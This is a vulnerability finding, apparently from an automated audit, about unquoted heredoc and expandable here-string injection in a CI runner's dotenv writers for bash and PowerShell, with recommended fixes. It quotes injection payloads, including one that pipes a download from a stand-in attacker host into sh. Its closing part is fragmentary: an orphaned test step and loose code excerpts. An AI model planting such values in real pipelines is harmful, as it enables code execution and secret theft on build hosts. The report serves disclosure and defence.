### Title
Attacker-controlled variable values escape unescaped heredoc/here-string in `DotEnvVariables`, enabling command substitution in later runner-generated script phases - (File: `shells/bash.go`, `shells/powershell.go`)

### Summary
`BashWriter.DotEnvVariables` writes variable values into a `cat << EOF` heredoc whose delimiter is **not quoted**, and `PsWriter.DotEnvVariables` writes them into a PowerShell **expandable** here-string (`@" ... "@`). Both heredoc/here-string forms are subject to shell/PowerShell expansion of `$(...)`, backticks, and variable references inside the body. `helpers.DotEnvEscape` only escapes characters relevant to the `.env`/dotenv file format (`\`, `"`, `\n`, `\r`) — it does not neutralize shell metacharacters — so a value containing `$(...)` or a backtick expression survives into the generated script and is executed by the interpreter when the heredoc/here-string is evaluated.

### Finding Description
`BashWriter.DotEnvVariables` builds the script fragment as: [1](#0-0) 

The heredoc terminator `EOF` is unquoted (`<< EOF`, not `<< 'EOF'`), which per POSIX/bash semantics means parameter expansion, command substitution, and backslash processing occur inside the heredoc body before the shell writes it to the target file. The body content comes from `helpers.DotEnvEscape`: [2](#0-1) 

`escapeDotEnvValue` only escapes `\`, `"`, `\n`, `\r` — characters meaningful to the dotenv/`godotenv` parser — but does nothing to neutralize `$(`, backticks, or bare `$VAR` sequences that are meaningful to bash when embedded in an *unquoted* heredoc. Consequently a variable value such as `x"; $(curl attacker.sh|sh) #` or simply `$(touch /tmp/pwned)` is emitted verbatim inside the heredoc and executed by the shell that is generating/writing the dotenv file, not merely stored as inert text.

The PowerShell equivalent has the analogous flaw: [3](#0-2) 

`@" ... "@` is PowerShell's *expandable* (double-quoted) here-string, which performs variable and subexpression (`$(...)`) interpolation on its contents. `DotEnvEscape` again does no PowerShell-specific escaping, so `$(Invoke-Expression ...)` embedded in a value is executed when the here-string is evaluated by PowerShell.

Because these values originate from dotenv-format data that can be authored by a job (e.g., variables exported via `artifacts:reports:dotenv` from one job/stage and reused as `variables` in a subsequent phase, or step/job metadata that ends up in the variables map passed to `DotEnvVariables`), an attacker who controls only the *value string* of a variable can inject shell/PowerShell syntax that executes when the runner later regenerates a script for a different, potentially more trusted, execution phase (e.g., when propagating dotenv-sourced variables into `after_script`/cleanup phases of a job, or into a downstream job/pipeline that consumes the dotenv artifact via `needs:`/`dependencies` on a differently-trusted runner).

Existing protections (dotenv key validation via `isValidDotEnvKey`, dotenv value escaping) only address the dotenv file format itself and the `.env` parser's syntax — they do not address the fact that the *runner's own generated script* re-embeds these values inside an unquoted/expandable interpolation context. This is the missing check: the boundary between "data written into a dotenv file" and "shell/PowerShell script text" is not preserved.

### Impact Explanation
An attacker who can influence a variable's value that flows into `DotEnvVariables` (e.g., via a dotenv artifact or exported variable reused across phases/jobs) can achieve command execution in the runner-generated script context at the point the dotenv-writing code runs — a context that may differ in trust level from where the value was originally produced (e.g., a later stage, a downstream job on a different/protected runner, or a job with access to protected variables/secrets not available to the originating job). This is command execution in a stronger or differently-trusted phase than the attacker's original input trust level, matching the scoped "stronger-context command execution" impact.

### Likelihood Explanation
The bug requires only that an attacker-controlled string reach the `variables` map passed into `DotEnvVariables` — a standard, unprivileged capability (setting/exporting a variable whose value contains `$(...)` or a backtick expression, e.g. via a dotenv artifact line like `FOO=$(id > /tmp/pwn)`). No special executor configuration or admin misconfiguration is needed; the flaw is in generic script-generation logic used by every shell/executor that relies on `BashWriter`/`PsWriter`. It is deterministic and repeatable.

### Recommendation
- For bash: quote the heredoc delimiter (`cat << 'EOF' > %s`) so the shell treats the entire body as literal text with no parameter/command expansion, matching the intent of writing raw dotenv content.
- For PowerShell: use a *literal* (single-quoted) here-string (`@' ... '@`) instead of the expandable `@" ... "@` form, so `$` and backtick sequences are not interpolated.
- As defense in depth, `helpers.DotEnvEscape` (or a shell-specific wrapper) should also validate/escape or reject values containing raw `$(`, backticks, or other characters that would be dangerous if a caller ever needs an unquoted context.
- Add regression tests asserting that a value like `` $(touch pwned) `` or `` `touch pwned` `` written via `DotEnvVariables` results in a file containing the literal string, and that no side-effect command runs when the generated script executes.

3. Assert: after Job B's after_script/cleanup phase runs, `/tmp/pwned` (or an out-of-band callback) exists on the runner/build host, proving code execution occurred outside the literal dotenv value.

	dotEnvFile := b.TmpFile(baseFilename)

func DotEnvEscape(variables map[string]string) string {
	var sb strings.Builder

	// Sort variables to get deterministic output
	keys := make([]string, 0, len(variables))
	for key := range variables {
		keys = append(keys, key)
	}
	sort.Strings(keys)

	for _, key := range keys {
		if !isValidDotEnvKey(key) {
			// Skip invalid keys
			continue
		}

		value := variables[key]
		fmt.Fprintf(&sb, "%s=\"%s\"\n", key, escapeDotEnvValue(value))
	}

	return sb.String()
}
